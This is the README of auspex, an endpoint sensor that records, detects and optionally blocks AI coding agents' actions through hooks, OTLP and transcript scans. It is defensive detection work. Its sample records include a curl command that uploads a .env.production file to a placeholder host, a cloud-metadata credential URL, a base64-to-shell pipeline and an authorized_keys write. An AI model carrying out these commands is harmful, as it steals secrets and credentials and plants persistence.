# auspex

**Endpoint visibility into AI agent activity, with local detection, optional pre-action blocking, and forensic reconstruction.**

[![Go](https://img.shields.io/badge/Go-1.26.5%2B-00ADD8?style=flat-square&logo=go&logoColor=white)](https://go.dev)
[![License](https://img.shields.io/badge/License-Apache%202.0-1E40AF?style=flat-square)](LICENSE)
[![Platforms](https://img.shields.io/badge/Platforms-macOS%20%7C%20Linux%20%7C%20Windows-475569?style=flat-square)](#install)
[![Schema](https://img.shields.io/badge/Record%20schema-v0.2.0-059669?style=flat-square)](docs/schema/v0.2.0/)

---

## What this project is

AI coding agents now run shell commands, read and write files, reach the network, and invoke MCP servers on developer workstations and CI runners. They do this continuously, semi-autonomously, and largely without leaving anything a security team can read. Each vendor persists its own session format, exposes its own hook contract, and answers to no shared schema. The result is a growing class of privileged activity on the endpoint that conventional EDR does not model and conventional log pipelines never receive.

**auspex is an endpoint sensor for that activity.** It attaches to the agents already installed on a machine, converts everything they do into one normalized event vocabulary, evaluates that stream against a local rule engine, and emits structured records an operator can alert on, investigate, and hand off.

It answers four questions:

| Question | Mechanism |
| --- | --- |
| What are the agents on this endpoint doing right now? | Synchronous hooks and generated plugins across 25 blocking-capable agents, plus an OTLP/HTTP receiver |
| What did they already do, before anyone was watching? | Read-only reconstruction from 11 parser-backed on-disk session stores, with no prior instrumentation |
| Which of those actions should someone look at? | 51 shipped CEL rules across 12 categories, including 6 multi-step sequence chains |
| Can a specific action be stopped before it executes? | Opt-in enforce mode returning each host's native deny response at its pre-action gate |

Three properties define the design. **Detection runs entirely on the endpoint** — no cloud dependency, no telemetry egress except to sinks the operator configures. **Every capture surface converges on one event model and one rule engine**, so a finding is identical whether it came from a live hook or a six-month-old transcript. **Monitoring and blocking are separated** — everything ships monitor-only, and blocking requires an explicit per-rule opt-in.

---

## Architecture

The system is a six-stage pipeline. Three dissimilar capture surfaces fan into a single normalization stage; everything downstream of that point is source-agnostic.

```mermaid
flowchart TB
    subgraph L1["OBSERVED AGENTS — 27 supported surfaces"]
        direction LR
        A1["CLI agents<br/>Codex, Gemini CLI, Copilot CLI<br/>Kimi Code, Qwen Code, Cline"]
        A2["IDE and desktop agents<br/>Claude Code, Cursor, Windsurf<br/>Kiro, VS Code Copilot, Factory Droid"]
        A3["Gateways and plugin hosts<br/>OpenClaw, Amp, Goose, Kilo<br/>Pi, Crush, OpenHands, Junie"]
    end

    subgraph L2["CAPTURE SURFACES"]
        direction LR
        C1["Hooks and plugins<br/>synchronous, pre-action<br/>can block"]
        C2["OTLP/HTTP receiver<br/>auspex collect<br/>asynchronous"]
        C3["On-disk artifacts<br/>auspex scan<br/>retrospective"]
    end

    subgraph L3["NORMALIZATION"]
        direction LR
        N1["Closed event vocabulary<br/>command.exec, file.read, file.write<br/>file.delete, network.indicator, tool.call"]
        N2["Contract validation<br/>rejected before detection"]
        N3["Secret redaction"]
    end

    subgraph L4["DETECTION — one engine for every source"]
        direction LR
        D1["CEL rule engine<br/>51 rules, 12 categories"]
        D2["Sequence correlation<br/>6 multi-step chains"]
        D3["Indicator accumulator<br/>folded across the run"]
    end

    DEC{"Enforce-eligible<br/>match on a clean run?"}
    DENY["Native deny response<br/>host rejects the action"]

    subgraph L5["RECORD STREAM — NDJSON, schema v0.2.0"]
        direction LR
        R1["event"]
        R2["finding"]
        R3["indicator"]
        R4["enforcement"]
        R5["diagnostic"]
        R6["scan summary"]
    end

    subgraph L6["DELIVERY AND INVESTIGATION"]
        direction LR
        O1["stdout"]
        O2["local file"]
        O3["HTTP sink<br/>auspex ship"]
        O4["timeline<br/>session reconstruction"]
        O5["case bundle<br/>SHA-256 manifest"]
    end

    A1 --> C1
    A2 --> C1
    A3 --> C1
    A1 --> C2
    A2 --> C3
    A3 --> C3

    C1 --> N1
    C2 --> N1
    C3 --> N1
    N1 --> N2
    N2 --> N3

    N3 --> D1
    N3 --> D2
    N3 --> D3

    D1 --> DEC
    D2 --> DEC
    DEC -->|"yes, and hook is in enforce mode"| DENY
    DEC -->|"no override"| R4
    DENY --> R4
    DENY -.->|"host decides: reject, prompt, execute"| A1

    N3 --> R1
    D1 --> R2
    D2 --> R2
    D3 --> R3

    R1 --> O1
    R2 --> O2
    R3 --> O2
    R4 --> O2
    O2 --> O3
    O2 --> O4
    O2 --> O5

    classDef agents fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a8a
    classDef capture fill:#e0e7ff,stroke:#4f46e5,stroke-width:2px,color:#312e81
    classDef normalize fill:#ede9fe,stroke:#7c3aed,stroke-width:2px,color:#4c1d95
    classDef detect fill:#fef3c7,stroke:#d97706,stroke-width:2px,color:#78350f
    classDef gate fill:#ffedd5,stroke:#ea580c,stroke-width:3px,color:#7c2d12
    classDef block fill:#fee2e2,stroke:#dc2626,stroke-width:3px,color:#7f1d1d
    classDef records fill:#d1fae5,stroke:#059669,stroke-width:2px,color:#064e3b
    classDef deliver fill:#cffafe,stroke:#0891b2,stroke-width:2px,color:#164e63

    class A1,A2,A3 agents
    class C1,C2,C3 capture
    class N1,N2,N3 normalize
    class D1,D2,D3 detect
    class DEC gate
    class DENY block
    class R1,R2,R3,R4,R5,R6 records
    class O1,O2,O3,O4,O5 deliver
```

The critical structural property is the convergence at normalization. A rule author writes one CEL expression; it applies to a live Codex hook payload, a Gemini OTLP log record, and a Claude Code transcript from last quarter without modification.

---

## How it works

### 1. Capture — three surfaces, different guarantees

The surfaces are not interchangeable. They differ in latency, completeness, and whether they can intervene.

```mermaid
flowchart LR
    subgraph HOOKS["HOOKS AND PLUGINS — synchronous"]
        direction TB
        H1["Agent invokes its pre-action<br/>callback before executing a tool"]
        H2["auspex hook reads one<br/>payload from stdin"]
        H3["Returns within the agent's<br/>hook timeout"]
        H1 --> H2 --> H3
    end

    subgraph OTEL["OTLP/HTTP — asynchronous"]
        direction TB
        T1["Agent exports logs over<br/>OpenTelemetry"]
        T2["auspex collect runs an<br/>in-process receiver"]
        T3["Observation only, arrives<br/>after the fact"]
        T1 --> T2 --> T3
    end

    subgraph REST["ON-DISK ARTIFACTS — retrospective"]
        direction TB
        S1["Agent persists its own<br/>session transcripts"]
        S2["auspex scan reads them<br/>read-only, never executes"]
        S3["Recovers activity that<br/>predates installation"]
        S1 --> S2 --> S3
    end

    CAP1["Can block an action"]
    CAP2["Cannot block"]
    CAP3["Cannot block, bounded<br/>by what the agent persisted"]

    H3 --> CAP1
    T3 --> CAP2
    S3 --> CAP3

    classDef sync fill:#fee2e2,stroke:#dc2626,stroke-width:2px,color:#7f1d1d
    classDef async fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a8a
    classDef disk fill:#d1fae5,stroke:#059669,stroke-width:2px,color:#064e3b
    classDef cap fill:#f1f5f9,stroke:#64748b,stroke-width:2px,color:#0f172a

    class H1,H2,H3 sync
    class T1,T2,T3 async
    class S1,S2,S3 disk
    class CAP1,CAP2,CAP3 cap
```

Only the synchronous hook path can intervene, and only at a host that exposes a genuine pre-action gate. The other two surfaces are strictly observational. At-rest reconstruction is bounded by what the agent chose to persist — it is not disk or memory acquisition, and it cannot recover an action the agent never wrote down.

### 2. Normalization — a deliberately narrow classifier

Every source is mapped into a closed vocabulary. The classifier is conservative by design: it promotes an action to a specific type only when the source's own structured fields support it, and never infers intent from prose, command output, or free-form previews.

```mermaid
flowchart TD
    IN["Tool request<br/>from a hook, an OTLP record, or an artifact"]
    Q1{"Is the tool name and<br/>argument shape verified<br/>for this source?"}
    Q2{"What does the structured<br/>argument shape support?"}

    CE["command.exec<br/>principal field: command"]
    FILE["file.read, file.write, file.delete<br/>principal field: file_path"]
    NET["network.indicator<br/>principal field: url"]
    TC["tool.call<br/>principal field: tool_name"]

    RES["Results are separate observations<br/>command.result and tool.result<br/>joined by tool_call_id"]
    MCP["MCP is a facet, not a category<br/>tool.call retains mcp_server and mcp_tool"]

    IN --> Q1
    Q1 -->|"no"| TC
    Q1 -->|"yes"| Q2
    Q2 -->|"shell or process request"| CE
    Q2 -->|"file access or change"| FILE
    Q2 -->|"known web or network call"| NET
    Q2 -->|"ambiguous direction or target"| TC

    CE --> RES
    TC --> RES
    TC --> MCP

    classDef input fill:#e0e7ff,stroke:#4f46e5,stroke-width:2px,color:#312e81
    classDef decision fill:#fef3c7,stroke:#d97706,stroke-width:3px,color:#78350f
    classDef typed fill:#d1fae5,stroke:#059669,stroke-width:2px,color:#064e3b
    classDef fallback fill:#f1f5f9,stroke:#64748b,stroke-width:2px,color:#0f172a
    classDef note fill:#ede9fe,stroke:#7c3aed,stroke-width:2px,color:#4c1d95

    class IN input
    class Q1,Q2 decision
    class CE,FILE,NET typed
    class TC fallback
    class RES,MCP note
```

These types are alternatives, not layers — a recognized shell request becomes `command.exec`, not an additional `tool.call`. The `tool.call` fallback exists to preserve visibility when a safe specific mapping is unavailable, rather than guessing. A `confidence` field records how directly the source supported the mapping.

Command events also carry an `opacity_score` and the `opacity_reasons` behind it, so one layer of wrapping — `bash -c "base64 -d p | sh"` — reports as 3 rather than as a single opaque string. A score of `0` is a real claim that auspex parsed the command and saw everything it does; a command it could not read carries **no score at all**, because emitting `0` there would fabricate a completeness auspex never had. See the [event model](docs/event-model.md) for the marker list.

### 3. Detection — one pass per event, with a fail-safe decision channel

Every sensor feeds `pipeline.Process`, which handles exactly one normalized event. Rule evaluation and enforcement authorization are deliberately decoupled: an unrelated rule erroring out does not invalidate a clean match, but any failure to *emit* a record does.

```mermaid
flowchart TD
    EV["One normalized event"]
    VAL{"Passes the<br/>normalized contract?"}
    REJ["Rejected and returned<br/>to the sensor"]

    EMIT["Emit event record<br/>if selected"]
    EVAL["Evaluate CEL rules"]
    SEQ["Feed the sequence window<br/>persisted store for hooks,<br/>in-memory tracker otherwise"]
    FIND["Build and emit findings<br/>from each match"]
    IND["Fold into the<br/>indicator accumulator"]

    CLEAN{"Did every finding<br/>emit successfully?"}
    ELIG{"Any match on a rule<br/>with enforce true?"}
    TAINT["Decision tainted<br/>deny suppressed permanently"]
    BLOCK["Authorize deny<br/>record rule id and version"]
    NOOV["No override<br/>host's normal permission flow"]

    EV --> VAL
    VAL -->|"no"| REJ
    VAL -->|"yes"| EMIT
    EMIT --> EVAL
    EVAL --> FIND
    EVAL --> SEQ
    SEQ --> FIND
    EMIT --> IND
    IND --> CLEAN
    FIND --> CLEAN

    CLEAN -->|"an emit failed"| TAINT
    CLEAN -->|"yes"| ELIG
    ELIG -->|"yes, and mode is enforce"| BLOCK
    ELIG -->|"no, or monitor mode"| NOOV
    TAINT --> NOOV

    classDef input fill:#e0e7ff,stroke:#4f46e5,stroke-width:2px,color:#312e81
    classDef decision fill:#fef3c7,stroke:#d97706,stroke-width:3px,color:#78350f
    classDef work fill:#ede9fe,stroke:#7c3aed,stroke-width:2px,color:#4c1d95
    classDef bad fill:#fee2e2,stroke:#dc2626,stroke-width:2px,color:#7f1d1d
    classDef good fill:#d1fae5,stroke:#059669,stroke-width:2px,color:#064e3b
    classDef neutral fill:#f1f5f9,stroke:#64748b,stroke-width:2px,color:#0f172a

    class EV input
    class VAL,CLEAN,ELIG decision
    class EMIT,EVAL,SEQ,FIND,IND work
    class REJ,TAINT bad
    class BLOCK good
    class NOOV neutral
```

The taint rule is the safety property worth understanding: **a deny must never outrun its operator record.** If any finding fails to emit during the run, the enforcement decision is poisoned and cannot be restored by a later clean event. auspex would rather let an action through than block it silently and leave no auditable trace of why.

Note also that the enforcement channel is uncapped while detection findings are subject to `max_matches` — a finding quota can never become a policy bypass.

### 4. Enforcement — the host remains the enforcement point

auspex never executes or cancels a tool itself. It answers a question the host asked, and the host decides what to do with the answer.

```mermaid
sequenceDiagram
    autonumber
    participant M as Model
    participant H as Agent host
    participant A as auspex hook
    participant E as Rule engine
    participant S as Record sink

    M->>H: proposes a tool action
    H->>A: pre-action callback on stdin
    A->>A: validate and normalize the payload
    A->>E: evaluate CEL rules and sequence window
    E-->>A: matches
    A->>S: emit event, finding, enforcement records

    alt Clean match on a rule marked enforce
        A-->>H: native deny response for this host
        H-->>M: action rejected
        Note over H,M: The host and often the model<br/>can still observe the refusal
    else Monitor mode, no match, or tainted decision
        A-->>H: no override
        H-->>M: host's normal permission flow
    end
```

The deny is generic by design — rule identifiers and evidence stay out of the control channel returned to the agent, though the decision itself is not concealed. Blocking is available only where a host publishes a genuine synchronous pre-action contract; 25 of the 27 supported surfaces qualify.

The state machine below is the whole enforcement authorization model:

```mermaid
stateDiagram-v2
    direction LR
    [*] --> Observing
    Observing --> Matched: a rule matched
    Matched --> NoOverride: monitor mode or detection-only rule
    Matched --> Eligible: rule sets enforce and hook is in enforce mode
    Eligible --> Blocked: run stayed clean
    Eligible --> Tainted: a record failed to emit
    Tainted --> NoOverride: deny permanently suppressed
    Blocked --> [*]
    NoOverride --> [*]
```

Enabling `--enforce` on a hook is not sufficient on its own. The shipped catalog is entirely monitor-only, and an enforce-mode install refuses to proceed unless at least one enabled rule actually sets `enforce: true`. Turning a shipped detection into a block is a deliberate act: copy its complete YAML into a controlled operator directory, keep the id, add the flag, and bump the version.

### 5. Rules — CEL expressions over the normalized event

The shipped catalog is 51 rules across 12 behavioral categories. Six of them are sequence rules that correlate multiple events within a session rather than matching a single action.

```mermaid
flowchart LR
    subgraph CAT["SHIPPED CATALOG — 51 rules"]
        direction TB
        C1["secrets — 8"]
        C2["exec — 6"]
        C3["persistence — 6"]
        C4["privilege — 6"]
        C5["chains — 6"]
        C6["exfil — 4"]
        C7["impact — 4"]
        C8["recon — 3"]
        C9["tamper — 3"]
        C10["integrity — 2"]
        C11["source_control — 2"]
        C12["lateral — 1"]
    end

    subgraph EVALK["EVALUATION"]
        direction TB
        SINGLE["Single-event rules<br/>one CEL expression<br/>over one normalized event"]
        CHAIN["Sequence rules<br/>ordered steps correlated<br/>within one session"]
    end

    subgraph OVERRIDE["OPERATOR CONTROL"]
        direction TB
        ADD["--rules-dir DIR<br/>add operator rules"]
        REPL["same id replaces the<br/>embedded rule entirely"]
        ONLY["--no-builtin-rules<br/>operator-only catalog"]
    end

    CAT --> EVALK
    EVALK --> OVERRIDE

    classDef cats fill:#fef3c7,stroke:#d97706,stroke-width:2px,color:#78350f
    classDef evalc fill:#ede9fe,stroke:#7c3aed,stroke-width:2px,color:#4c1d95
    classDef ops fill:#cffafe,stroke:#0891b2,stroke-width:2px,color:#164e63

    class C1,C2,C3,C4,C5,C6,C7,C8,C9,C10,C11,C12 cats
    class SINGLE,CHAIN evalc
    class ADD,REPL,ONLY ops
```

Rules match against parsed structure, not raw text. A rule can read `event.command` directly, but the parsed `shell_commands` view is preferred when a decision depends on executable semantics — raw input can contain comments, quoted examples, and other text a shell would never run. When a *block* derives from `shell_commands`, auspex narrows to a much smaller statically-analyzable subset: one simple command or pipeline, static arguments only, and no substitutions, conditionals, loops, `eval`, or inline interpreters.

### 6. Records and investigation

Everything auspex observes leaves as versioned NDJSON. Six record types share one envelope and one schema version.

```mermaid
flowchart TB
    subgraph RECS["RECORD TYPES — schema v0.2.0"]
        direction LR
        E["event<br/>one normalized action"]
        F["finding<br/>a rule match, with cited_event_ids"]
        I["indicator<br/>run-level aggregate"]
        N["enforcement<br/>the computed policy decision"]
        D["diagnostic<br/>parse and evaluation problems"]
        SU["scan summary<br/>coverage of a scan run"]
    end

    subgraph SINKS["SINKS"]
        direction LR
        STDOUT["stdout"]
        FILE["local file<br/>~/.auspex/records.ndjson"]
        HTTP["HTTP endpoint"]
    end

    SHIP["auspex ship<br/>tails the file and batches to HTTP<br/>state advances only on 2xx<br/>at-least-once across outages"]

    subgraph INV["INVESTIGATION"]
        direction LR
        TL["auspex timeline<br/>groups by agent, source, session<br/>evaluates no rules"]
        CB["auspex case build<br/>findings plus their cited events<br/>byte-for-byte, deduplicated, sorted"]
        CV["auspex case verify<br/>re-hashes against manifest.json"]
    end

    E --> STDOUT
    F --> STDOUT
    E --> FILE
    F --> FILE
    I --> FILE
    N --> FILE
    D --> FILE
    SU --> FILE
    F --> HTTP

    FILE --> SHIP
    SHIP --> HTTP

    FILE --> TL
    FILE --> CB
    CB --> CV

    classDef recs fill:#d1fae5,stroke:#059669,stroke-width:2px,color:#064e3b
    classDef sinks fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a8a
    classDef ship fill:#ede9fe,stroke:#7c3aed,stroke-width:2px,color:#4c1d95
    classDef inv fill:#cffafe,stroke:#0891b2,stroke-width:2px,color:#164e63

    class E,F,I,N,D,SU recs
    class STDOUT,FILE,HTTP sinks
    class SHIP ship
    class TL,CB,CV inv
```

A `case.auspex` bundle is the handoff artifact: the case's findings, the events their `cited_event_ids` name, any case-scoped enforcement decisions, and a `manifest.json` of per-file SHA-256 digests. Identical ordered inputs produce identical record files. Evidence entries carry separate hashes for the source bytes and the stored bytes, so a redacted copy can never be mistaken for the original artifact.

The manifest establishes internal consistency, not authenticity. An unsigned bundle does not prove where it came from or that it is complete.

---

## Internal structure

Packages form a strict acyclic layering, enforced in CI by `internal/archguard`. Arrows point from a package to the packages it imports.

```mermaid
flowchart TD
    CMD["cmd/auspex<br/>CLI surface, all commands"]

    PIPE["internal/pipeline<br/>per-event core"]
    RULES["rules<br/>embedded catalog"]
    CASE["internal/casebundle"]
    OTEL["internal/otel"]
    DISC["internal/discover"]
    HOOK["internal/hook"]
    EXTR["internal/extract"]

    FIND["internal/finding"]
    OUT["internal/output"]
    SEQ["internal/sequence"]
    RULE["internal/rule<br/>CEL engine"]
    RED["internal/redact"]

    MODEL["internal/model<br/>event vocabulary and contracts"]
    PLAT["internal/winfile, internal/applypatch<br/>internal/state, internal/version"]

    CMD --> PIPE
    CMD --> RULES
    CMD --> CASE
    CMD --> OTEL
    CMD --> DISC
    CMD --> HOOK
    CMD --> EXTR

    PIPE --> FIND
    PIPE --> OUT
    PIPE --> SEQ
    PIPE --> RULE
    RULES --> SEQ
    CASE --> OUT
    OTEL --> MODEL
    DISC --> MODEL
    HOOK --> PLAT
    EXTR --> PLAT

    FIND --> RED
    FIND --> SEQ
    OUT --> RED
    SEQ --> RULE
    RULE --> MODEL
    RED --> MODEL
    OUT --> PLAT
    CASE --> PLAT

    classDef cli fill:#fee2e2,stroke:#dc2626,stroke-width:2px,color:#7f1d1d
    classDef mid fill:#fef3c7,stroke:#d97706,stroke-width:2px,color:#78350f
    classDef core fill:#ede9fe,stroke:#7c3aed,stroke-width:2px,color:#4c1d95
    classDef base fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a8a

    class CMD cli
    class PIPE,RULES,CASE,OTEL,DISC,HOOK,EXTR mid
    class FIND,OUT,SEQ,RULE,RED core
    class MODEL,PLAT base
```

`internal/model` is the keystone: it defines the event vocabulary every other package agrees on, and depends on nothing but platform primitives.

---

## Quick start

### Install

[Download a release](https://github.com/Sri-Krishna-V/auspex/releases) for macOS, Linux,
or Windows on amd64 or arm64. Each release includes SHA-256 checksums. You can
also install with Go 1.26.5 or newer:

```sh
go install github.com/Sri-Krishna-V/auspex/cmd/auspex@latest
```

<details>
<summary>Build a static binary from a checkout</summary>

macOS or Linux:

```sh
CGO_ENABLED=0 go build -trimpath -o auspex ./cmd/auspex
```

Windows PowerShell:

```powershell
$env:CGO_ENABLED = "0"
go build -trimpath -o auspex.exe ./cmd/auspex
```

</details>

### Inventory and scan

These read-only commands do not install hooks or change agent configuration:

```sh
auspex agents
# scan all discovered parser-backed agents
auspex scan
# or limit automatic discovery to Codex
auspex scan --agent codex
```

`auspex agents` reports a `WIRED` column read from configuration and an
`OBSERVED` column read from auspex's own execution record: the last time a hook
callback actually ran for that agent on this machine. `never` means no hook
execution was recorded here — not that the agent never ran, and not that
nothing happened. Agents seen only by at-rest scanning never stamp the column,
so `wired: yes` with `observed: never` is a normal reading for an agent that
has not been used since the hook was installed.

### Monitor and enforce

Install live monitoring for any agent with
[live-capture support](docs/agent-coverage.md#matrix); the commands below use
Codex as a concrete example. Hooks start in monitor-only mode. `--emit all`
writes events, findings, indicators, and applicable enforcement decisions to
`~/.auspex/records.ndjson`.

```sh
auspex hook install --agent codex --emit all
auspex hook status --agent codex
```

> **Hook trust:** Requirements vary by agent and scope. For the Codex user hook
> above, review and trust its current definition in `/hooks` (CLI) or
> Settings > Hooks (app), including after changes such as `--enforce`. Codex
> hooks installed with `--managed` are trusted by policy. `hook status` verifies
> configuration, not execution or delivery. See the
> [deployment guide](docs/deployment.md#hook-trust-and-activation) for other
> agents and scopes.

All shipped rules are monitor-only. To enforce a detection, copy its complete
[shipped YAML](rules/) into a controlled operator directory, keep the same id,
add `enforce: true`, and bump its version. Validate and install that effective
policy for a supported pre-action hook:

```sh
auspex rules check --rules-dir ./auspex-policy
auspex hook install --agent codex --emit all \
  --rules-dir ./auspex-policy --enforce
```

---

## Example output

<details>
<summary><strong>Hook event</strong> (OpenClaw cloud-metadata browser request)</summary>

A controlled OpenClaw `before_tool_call` callback passed through auspex's
generated plugin becomes a typed network event with its proposed destination
and execution context. It also matches the high-severity cloud-metadata rule.

```json
{
  "actor": "assistant",
  "confidence": "medium",
  "content_preview": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "endpoint": {
    "hostname": "developer-workstation", "os": "linux", "arch": "arm64",
    "username": "node", "uid": "1000"
  },
  "event_id": "hook-run-20260724T151125.690671167-fa0a4148090fa1ba",
  "event_type": "network.indicator",
  "evidence": {"artifact_type": "hook"},
  "project_path": "/workspace/acme-api",
  "record_type": "event",
  "run_id": "run-20260724T151125.690671167-fa0a4148090fa1ba",
  "schema_version": "0.2.0",
  "session_id": "agent:research:metadata-review",
  "source_agent": "openclaw",
  "source_type": "hook",
  "sub_agent": "research",
  "tags": ["network"],
  "timestamp": "2026-07-24T15:20:00Z",
  "tool_call_id": "tool-cloud-metadata-01",
  "tool_name": "browser",
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

</details>

<details>
<summary><strong>Sequence finding</strong> (Claude Code hook sequence)</summary>

A controlled replay of two contract-valid Claude Code pre-action callbacks in
one session—secret-file access, then a proposed upload—produced this finding.
The rule also runs during artifact scans; the finding does not prove either
action completed.

```json
{
  "cited_event_ids": [
    "hook-run-20260724T143947.587655000-2030b2e550b19261",
    "hook-run-20260724T144025.562634000-e18f9d375ddb1c1b"
  ],
  "confidence": "medium",
  "detected_at": "2026-07-24T14:40:29.226642Z",
  "endpoint": {
    "hostname": "developer-workstation", "os": "linux", "arch": "arm64",
    "username": "agent", "uid": "10001"
  },
  "evidence_refs": [
    {"artifact_type": "hook"},
    {"artifact_type": "hook"}
  ],
  "finding_id": "fnd-01be6f0c659d060e7c993a73",
  "observed_actor": "assistant",
  "observed_command": "curl --data-binary @/workspace/acme-api/.env.production https://collector.example.invalid/ingest",
  "observed_event_type": "command.exec",
  "project_path_hash": "sha256:6780eeb53603bd5da1c0ec3e25d9e94d8be668392f24def8903a2a34f8e3fcb0",
  "record_type": "finding",
  "redacted": false,
  "rule_id": "chain.secret_read_then_egress",
  "rule_version": "1.4",
  "run_id": "run-20260724T144025.562634000-e18f9d375ddb1c1b",
  "schema_version": "0.2.0",
  "session_id": "readme-live-sequence-01",
  "severity": "high",
  "source_agent": "claude-code",
  "source_type": "hook",
  "tags": ["attack.t1048", "attack.t1552", "attack.t1567"],
  "timestamp": "2026-07-24T14:40:25.562634Z",
  "title": "Secret-file access followed by data-bearing egress"
}
```

</details>

<details>
<summary><strong>Enforcement decision</strong> (Codex <code>authorized_keys</code> write)</summary>

With a same-id operator replacement of `persistence.ssh_authorized_keys`
marked `enforce: true` at version `1.3`, a Codex `create_file` pre-action
matched the rule and auspex selected the agent-specific deny response. See
[Decisions](docs/enforcement.md#decisions) for delivery and enforcement semantics.

```json
{
  "action_event_ids": [
    "hook-run-20260724T134723.452402000-6886c86cefad57b8"
  ],
  "decision": "deny",
  "decision_id": "enf-5132cfdb6ae4d57350ec734d",
  "deny_rule_id": "persistence.ssh_authorized_keys",
  "deny_rule_version": "1.3",
  "endpoint": {
    "hostname": "developer-workstation", "os": "linux", "arch": "arm64",
    "username": "agent", "uid": "10001"
  },
  "finding_ids": [
    "fnd-f467992648daec0a927b6de7"
  ],
  "mode": "enforce",
  "model": "gpt-5.6-codex",
  "reason": "enforce_rule_match",
  "record_type": "enforcement",
  "rule_ids": [
    "persistence.ssh_authorized_keys"
  ],
  "run_id": "run-20260724T134723.452402000-6886c86cefad57b8",
  "schema_version": "0.2.0",
  "session_id": "sess-doc-codex-enforce-01",
  "source_agent": "codex",
  "source_type": "hook",
  "timestamp": "2026-07-24T13:47:23.502411Z",
  "tool_call_id": "tool-doc-codex-enforce-01",
  "tool_name": "create_file"
}
```

</details>

See the [built-in rule catalog](docs/rule-catalog.md) for other
detected behaviors.

The [CLI reference](docs/cli.md#the-record-stream) defines the complete record
contract, flags, and sinks. For rollout patterns and output durability, see
[docs/deployment.md](docs/deployment.md).

---

## Command overview

| Group | Commands | Purpose |
| --- | --- | --- |
| Inventory and investigation | `agents`, `scan`, `timeline` | Read-only discovery, artifact scanning, session reconstruction |
| Live capture | `hook install`, `hook status`, `hook uninstall`, `collect` | Wire and inspect hooks; run the OTLP receiver |
| Record delivery | `ship` | Tail an NDJSON file and forward batches over HTTP |
| Rule development | `rules check`, `rules list`, `rules test` | Validate, enumerate, and test the effective catalog |
| Case bundles | `case build`, `case verify` | Curate and integrity-check a portable handoff |

Run `auspex --help` for the complete command list or
`auspex help <command>` for flags. See the [CLI reference](docs/cli.md) for
record modes, sinks, and exit codes.

`scan`, `collect`, `hook EVENT`, `hook install`, and `rules check|list|test`
accept `--rules-dir DIR` (repeatable) to add operator rules or replace embedded
rules by id.
Use `--no-builtin-rules` for an operator-only catalog. A replacement is never
silent: the run warns with the replaced ids, and every record carries a
`ruleset_digest` over the rule files that actually loaded, so a swapped catalog
is visible on the wire instead of looking like a healthy endpoint. Full flag and
output reference: [docs/cli.md](docs/cli.md).

---

## Documentation

- [Agent coverage](docs/agent-coverage.md): supported artifacts, live capture,
  enforcement, and known gaps.
- [Event model](docs/event-model.md): normalization, action types, correlation,
  and MCP fields.
- [CLI reference](docs/cli.md): commands, flags, records, sinks, and exit codes.
- [Live capture](docs/live-capture.md): hook and OTLP setup.
- [Deployment](docs/deployment.md): install scope, trust, fleet rollout, and
  output delivery.
- [Enforcement](docs/enforcement.md): blocking semantics and failure behavior.
- [Rules](docs/rules.md): custom rule format, CEL fields, tests, and sequences.
- [Built-in rules](docs/rule-catalog.md): shipped detection coverage.
- [Record schemas](docs/schema/v0.2.0/): JSON Schemas for the current wire format.

---

## Scope and limits

The [coverage matrix](docs/agent-coverage.md) documents support and known gaps
per agent, including deferred stores, fidelity limits, and root overrides.
Native Windows uses vendor-defined profile and AppData paths; WSL uses a
separate Linux home. auspex never executes agents or commands found in
artifacts, and it makes outbound requests only to configured HTTP sinks.

At-rest reconstruction is not disk or memory acquisition and cannot recover
activity an agent did not persist. Findings are rule matches, not proof of
compromise. Case-bundle manifests establish internal consistency; unsigned
bundles do not prove source authenticity or completeness.

## Security

Records can retain sensitive endpoint and agent context after redaction. See
[SECURITY.md](SECURITY.md) for the threat model and private vulnerability
reporting.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for the development workflow, CI gates,
and architecture constraints.

## License

Apache License 2.0. See [LICENSE](LICENSE).
